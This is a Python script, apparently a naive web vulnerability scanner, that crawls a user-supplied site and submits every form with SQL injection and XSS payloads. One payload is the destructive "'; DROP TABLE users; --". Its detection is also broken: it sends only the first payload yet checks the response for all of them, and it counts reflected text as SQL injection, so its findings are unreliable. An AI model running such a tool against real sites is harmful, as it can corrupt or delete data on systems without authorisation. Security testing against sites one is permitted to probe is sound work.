import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# Payloads
sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1--"]
xss_payloads = ['<script>alert("XSS")</script>', '" onmouseover="alert(1)"']

# Set to avoid scanning the same link twice
visited_links = set()

def is_vulnerable(response_text, payload):
    return payload in response_text

def scan_forms(url, payloads, vuln_type):
    try:
        res = requests.get(url)
        soup = BeautifulSoup(res.content, "html.parser")
        forms = soup.find_all("form")
        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")
            form_data = {}

            for input_tag in inputs:
                name = input_tag.get("name")
                if name:
                    form_data[name] = payloads[0]  # Use the first payload

            target_url = urljoin(url, action)
            if method == "post":
                response = requests.post(target_url, data=form_data)
            else:
                response = requests.get(target_url, params=form_data)

            for payload in payloads:
                if is_vulnerable(response.text, payload):
                    print(f"[!!] {vuln_type} vulnerability found in form at {url}")
                    break
    except Exception as e:
        print(f"[ERROR] Failed to scan forms on {url} => {e}")

def crawl_and_scan(url):
    if url in visited_links:
        return
    visited_links.add(url)

    try:
        res = requests.get(url)
        soup = BeautifulSoup(res.content, "html.parser")

        print(f"\n[+] Scanning URL: {url}")
        scan_forms(url, sql_payloads, "SQL Injection")
        scan_forms(url, xss_payloads, "XSS")

        base_domain = urlparse(url).netloc

        for link in soup.find_all("a"):
            href = link.get("href")
            if href:
                full_url = urljoin(url, href)
                link_domain = urlparse(full_url).netloc
                if link_domain == base_domain:
                    crawl_and_scan(full_url)

    except Exception as e:
        print(f"[ERROR] Failed to crawl {url} => {e}")

# 🔽 Start the scan
if __name__ == "__main__":
    target = input("Enter target URL (e.g. http://testphp.vulnweb.com): ")
    crawl_and_scan(target)
